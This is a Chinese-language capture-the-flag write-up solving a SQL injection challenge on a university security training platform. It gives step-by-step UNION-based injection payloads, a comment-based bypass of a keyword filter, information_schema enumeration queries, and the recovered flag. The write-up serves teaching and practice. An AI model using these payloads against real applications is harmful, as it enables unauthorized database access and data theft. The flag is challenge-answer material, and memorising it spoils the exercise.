# SQL注入

## ZJU校巴

### [SQL injection](https://zjusec.com/challenges/16)

观察题目源码：

```php
$query_string = "SELECT * FROM melody_bu_shi_ji_lao WHERE id = " . $_GET['questionid'];
```

后端把 questionid 直接拼进 SQL 语句里，没有做过滤或参数化.

判断原查询有几列：UNION 注入要求前后两个 SELECT 的列数一致。

用 ORDER BY 测试列数：

  ?questionid=0 order by 1
  ?questionid=0 order by 2
  ?questionid=0 order by 3
  ?questionid=0 order by 4

  结果：

  order by 1 正常
  order by 2 正常
  order by 3 正常
  order by 4 报错

  所以原查询有 3 列。

  也就是说可以构造：

  UNION SELECT 1,2,3

  ———

  4. 绕过 UNION 过滤

  题目说它会检测：

  " union "

  注意是前后带空格的 union。

  所以直接写：

  -1 union select 1,2,3

  可能会被拦截。

  绕过方式是用 MySQL 注释代替空格：

  -1/**/union/**/select/**/1,2,3

  完整请求：

  ?questionid=-1/**/union/**/select/**/1,2,3

  页面回显：

  1   2   3

  说明 UNION 注入可用，而且第 2 列和第 3 列都能显示内容。

  ———

  5. 获取当前数据库名

  构造：

  ?questionid=-1/**/union/**/select/**/1,database(),3

  对应 SQL：

  SELECT * FROM melody_bu_shi_ji_lao WHERE id = -1
  UNION
  SELECT 1, database(), 3;

  回显：

  1   aaa_web2   3

  当前数据库名是：

  aaa_web2

  ———

  6. 枚举表名

  从 information_schema.tables 查询当前数据库下的表：

  ?questionid=-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/
  where/**/table_schema=database()),3

  回显：

  flag_is_here,melody_bu_shi_ji_lao

  表名里有：

  flag_is_here

  题目也提示 flag 就在这个表里。

  ———

  7. 枚举字段名

  查询 flag_is_here 表的字段：

  ?questionid=-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/
  where/**/table_schema=database()/**/and/**/table_name=0x666c61675f69735f68657265),3

  这里：

  0x666c61675f69735f68657265

  是字符串 flag_is_here 的十六进制写法，避免引号问题。

  回显：

  author,flag,an_extra_message

  说明表中有字段：

  author
  flag
  an_extra_message

  ———

  8. 读取 flag

  一开始如果直接查：

  select flag from flag_is_here

  可能会报错，因为表里有多行，子查询返回多行会导致错误。

  所以用 group_concat() 把多行拼接成一行：

  ?questionid=-1/**/union/**/select/**/1,(select/**/group_concat(flag)/**/from/**/flag_is_here),3

  回显里出现：

  AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080},这个不是Flag,只是秀个恩爱

  为了区分真假，再把 author、flag、an_extra_message 一起查出来：

  ?questionid=-1/**/union/**/select/**/1,(select/**/group_concat(concat_ws(0x7c,author,flag,an_extra_message)/**/
  separator/**/0x0a)/**/from/**/flag_is_here),3

  其中：

  0x7c

  是字符 |。

  回显：

  Aploium|AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080}|技术有多强,责任就有多大. DO NOT EVIL
  Aploium|这个不是Flag,只是秀个恩爱|吱吱我爱你~

  所以真正的 flag 是：

  AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080}

  ———

  总结

  这题的核心是：

  数字型 SQL 注入 + UNION 查询 + information_schema 枚举 + 注释绕过空格过滤

  完整思路：

  确认注入
  → 判断列数
  → UNION SELECT 找回显位
  → 查 database()
  → 查 information_schema.tables
  → 查 information_schema.columns
  → 查 flag_is_here.flag

  最终 flag：

  AAA{welc0me_to_AAA_Congratu1ationS_qq_group_386796080}